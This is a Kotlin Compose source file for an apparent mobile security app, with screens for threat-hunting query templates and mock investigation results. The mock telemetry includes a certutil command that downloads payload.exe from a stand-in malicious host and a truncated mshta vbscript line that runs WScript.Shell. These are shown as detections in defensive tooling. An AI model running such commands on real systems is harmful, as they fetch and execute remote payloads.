package com.sophos.security.mobile.feature.hunting

import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.unit.dp
import com.sophos.security.mobile.core.designsystem.components.*
import com.sophos.security.mobile.core.designsystem.theme.*
import com.sophos.security.mobile.core.model.*
import com.sophos.security.mobile.core.network.MockSecurityRepository

@Composable
fun ThreatHuntingScreen(
    onNavigateToInvestigation: (String) -> Unit,
    onNavigateBack: () -> Unit
) {
    val templates = remember { MockSecurityRepository.getHuntTemplates() }

    Scaffold(
        topBar = {
            SecurityTopBar(
                title = "XDR Threat Hunting",
                subtitle = "Data Lake & Live Discover",
                canNavigateBack = true,
                onNavigateBack = onNavigateBack
            )
        },
        containerColor = DarkBackground
    ) { padding ->
        LazyColumn(
            modifier = Modifier
                .fillMaxSize()
                .padding(padding)
                .padding(16.dp),
            verticalArrangement = Arrangement.spacedBy(14.dp)
        ) {
            item {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(10.dp),
                    colors = CardDefaults.cardColors(containerColor = DarkSurfaceContainer)
                ) {
                    Column(modifier = Modifier.padding(14.dp)) {
                        Row {
                            Icon(Icons.Default.Info, contentDescription = null, tint = SecurityGreen, modifier = Modifier.size(18.dp))
                            Spacer(modifier = Modifier.width(8.dp))
                            Text("Approved Hunting Query Templates", style = MaterialTheme.typography.titleSmall, color = Color.White)
                        }
                        Spacer(modifier = Modifier.height(6.dp))
                        Text(
                            "Execute parameterized queries safely against the Sophos Data Lake. Queries are pre-validated to protect endpoint performance.",
                            style = MaterialTheme.typography.bodySmall,
                            color = DarkOnSurfaceMuted
                        )
                    }
                }
            }

            items(templates) { tmpl ->
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(10.dp),
                    colors = CardDefaults.cardColors(containerColor = DarkSurface),
                    border = CardDefaults.outlinedCardBorder().copy(width = 0.5.dp, brush = androidx.compose.ui.graphics.SolidColor(DarkBorder))
                ) {
                    Column(modifier = Modifier.padding(14.dp)) {
                        Text(tmpl.name, style = MaterialTheme.typography.titleSmall, color = Color.White)
                        Spacer(modifier = Modifier.height(4.dp))
                        Text("Tactic: ${tmpl.mitreTactic}", style = MaterialTheme.typography.labelSmall, color = SecurityGreen)
                        Spacer(modifier = Modifier.height(6.dp))
                        Text(tmpl.description, style = MaterialTheme.typography.bodySmall, color = DarkOnSurfaceMuted)
                        Spacer(modifier = Modifier.height(10.dp))
                        Box(
                            modifier = Modifier
                                .fillMaxWidth()
                                .background(DarkBackground, RoundedCornerShape(6.dp))
                                .padding(8.dp)
                        ) {
                            Text(tmpl.querySql, style = MaterialTheme.typography.labelSmall, fontFamily = FontFamily.Monospace, color = DarkOnSurface)
                        }
                        Spacer(modifier = Modifier.height(10.dp))
                        Button(
                            onClick = { onNavigateToInvestigation("job-${tmpl.id}") },
                            colors = ButtonDefaults.buttonColors(containerColor = SecurityGreen),
                            shape = RoundedCornerShape(6.dp)
                        ) {
                            Text("DISPATCH HUNT JOB", color = Color.Black)
                        }
                    }
                }
            }
            item { Spacer(modifier = Modifier.height(24.dp)) }
        }
    }
}

@Composable
fun InvestigationScreen(
    jobId: String,
    onNavigateBack: () -> Unit
) {
    Scaffold(
        topBar = {
            SecurityTopBar(
                title = "Investigation Results",
                subtitle = "Job: $jobId",
                canNavigateBack = true,
                onNavigateBack = onNavigateBack
            )
        },
        containerColor = DarkBackground
    ) { padding ->
        LazyColumn(
            modifier = Modifier
                .fillMaxSize()
                .padding(padding)
                .padding(16.dp),
            verticalArrangement = Arrangement.spacedBy(14.dp)
        ) {
            item {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(10.dp),
                    colors = CardDefaults.cardColors(containerColor = DarkSurface)
                ) {
                    Column(modifier = Modifier.padding(14.dp)) {
                        Text("EXECUTION METRICS", style = MaterialTheme.typography.labelMedium, color = DarkOnSurfaceMuted)
                        Spacer(modifier = Modifier.height(8.dp))
                        Text("Status: COMPLETED (200 OK)", style = MaterialTheme.typography.bodySmall, color = SecurityGreen)
                        Text("Matched Rows: 3", style = MaterialTheme.typography.bodySmall, color = Color.White)
                        Text("Execution Time: 342ms", style = MaterialTheme.typography.bodySmall, color = DarkOnSurfaceMuted)
                    }
                }
            }

            item {
                Text("RETIEVED TELEMETRY ROWS", style = MaterialTheme.typography.labelMedium, color = DarkOnSurfaceMuted)
            }

            item {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(10.dp),
                    colors = CardDefaults.cardColors(containerColor = DarkSurface),
                    border = CardDefaults.outlinedCardBorder().copy(width = 0.5.dp, brush = androidx.compose.ui.graphics.SolidColor(DarkBorder))
                ) {
                    Column(modifier = Modifier.padding(12.dp)) {
                        Text("Host: FIN-WS-4091 | Time: 2026-10-24 06:12:00Z", style = MaterialTheme.typography.labelSmall, color = SecurityGreen)
                        Text("Process: C:\\Windows\\System32\\certutil.exe", style = MaterialTheme.typography.bodySmall, fontFamily = FontFamily.Monospace, color = Color.White)
                        Text("CmdLine: -urlcache -split -f http://malicious-cdn.org/payload.exe", style = MaterialTheme.typography.bodySmall, fontFamily = FontFamily.Monospace, color = SeverityCritical)
                    }
                }
            }

            item {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(10.dp),
                    colors = CardDefaults.cardColors(containerColor = DarkSurface),
                    border = CardDefaults.outlinedCardBorder().copy(width = 0.5.dp, brush = androidx.compose.ui.graphics.SolidColor(DarkBorder))
                ) {
                    Column(modifier = Modifier.padding(12.dp)) {
                        Text("Host: SEC-CORP-DC01 | Time: 2026-10-24 05:48:12Z", style = MaterialTheme.typography.labelSmall, color = SecurityGreen)
                        Text("Process: C:\\Windows\\System32\\mshta.exe", style = MaterialTheme.typography.bodySmall, fontFamily = FontFamily.Monospace, color = Color.White)
                        Text("CmdLine: vbscript:Close(Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run...\"))", style = MaterialTheme.typography.bodySmall, fontFamily = FontFamily.Monospace, color = SeverityHigh)
                    }
                }
            }
        }
    }
}
